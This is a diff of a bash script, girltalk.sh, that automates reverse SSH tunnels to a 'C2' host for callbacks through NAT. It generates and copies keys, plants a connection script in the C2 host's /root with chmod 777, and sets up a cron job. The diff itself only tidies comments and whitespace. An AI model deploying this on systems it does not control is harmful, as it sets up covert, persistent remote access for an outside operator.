@@ -16,10 +16,8 @@ set -e
 bold=$(tput bold)
 normal=$(tput sgr0)
 
-
 USAGE="
-A bash script to automate reverse reverse ssh tunnels. Handy for callbacks
-through NAT.
+A bash script to automate reverse ssh tunnels. Handy for callbacks through NAT.
 girltalk.sh:
   -a	Use AWS C2 infrastructure.
   -s    Use autossh method (more stable)
@@ -32,13 +30,11 @@ usage:	 girltalk.sh -c <C2 hostname/IP> -l <local_username> -u <C2_username>
 example: girltalk.sh -c host.aws.com -u ubuntu -l hatchetface -a -k ~/.ssh/amazon.keypair.pem
 "
 
-
 # Check if any flags were set. If not, print out help.
 if [ $# -eq 0 ]; then
 	echo "$USAGE"
 	exit
 fi
-
 
 # Set flags.
 while getopts "ahk:c:u:l:" FLAG
@@ -69,8 +65,7 @@ do
 	esac
 done
 
-
-# Make sure each required flag was actually set.
+# Make sure each required flag was set
 if [ -z ${USERC2+x} ]; then
 	echo "Remote username (-u) is not set."
 	echo "$USAGE"
@@ -85,13 +80,11 @@ elif [ -z ${HOST+x} ]; then
 	exit
 fi
 
-
 # Check for connectivity
 echo "${bold}### Checking For Internet ###"
 if ping -q -c 1 -W 1 1.1.1.1 >/dev/null; then
     echo "${bold}### IPv4 is up! ###"
     printf "\n"
-
 
 # Installing deps
 if (systemctl -q is-active sshd.service)
@@ -108,12 +101,10 @@ else
 fi
     printf "\n"
 
-
 # Generate local key
     echo "${bold}### Generating 4096 keypair ###"
     ssh-keygen -b 4096
     printf "\n"
-
 
 # Error checking for user input
     until id "$USERLOCAL" >/dev/null; do
@@ -130,25 +121,21 @@ done
 
 if [ ${AWS} -eq 1 ]; then
 
-
 # Transferring local key to C2
     echo "${bold}### Copying key to C2 host ###"
     echo "${USERLOCAL}, ${KEY}, ${USERC2}, ${HOST}"
     scp -i ${KEY} /home/${USERLOCAL}/.ssh/id_rsa.pub ${USERC2}@${HOST}:/home/${USERC2}/.ssh/
     printf "\n"
 
-
 # Generating an ssh key on your C2
     ssh $HOST 'ssh-keygen'
 
-
-# Creating hmu.sh, which should be run on the C2 host. This file transfers the C2 key back to the host and attaches$
+# Creating hmu.sh, which should be run on the C2 host
     echo "${bold}### Creating & transferring remote connection script ###"
     echo "ssh-copy-id ${USERLOCAL}@localhost -p 43022 && ssh ${USERLOCAL}@localhost -p 43022" > /home/$USERLOCAL/hm$
     sudo chmod 777 /home/$USERLOCAL/hmu_$USERLOCAL.sh
     scp /home/$USERLOCAL/hmu_$USERLOCAL.sh $HOST:/root
     printf "\n"
-
 
 # Setup local cron job + cleanup
     echo "${bold}### Setting up local cronjob ###"
@@ -167,11 +154,8 @@ else
     ssh-copy-id $HOST
     printf "\n"
 
-
-
-# Generating an ssh key on your C2
+# Generating an ssh key on specified C2
     ssh $HOST 'ssh-keygen'
-
 
 # Creating hmu.sh, which should be run on the C2 host. This file transfers the C2 key back to the host and attaches to the SSH session.
     echo "${bold}### Creating & transferring remote connection script ###"
@@ -179,7 +163,6 @@ else
     sudo chmod 777 /home/$USERLOCAL/hmu_$USERLOCAL.sh 
     scp /home/$USERLOCAL/hmu_$USERLOCAL.sh $HOST:/root
     printf "\n"
-
 
 # Setup local cron job + cleanup
     echo "${bold}### Setting up local cronjob ###"
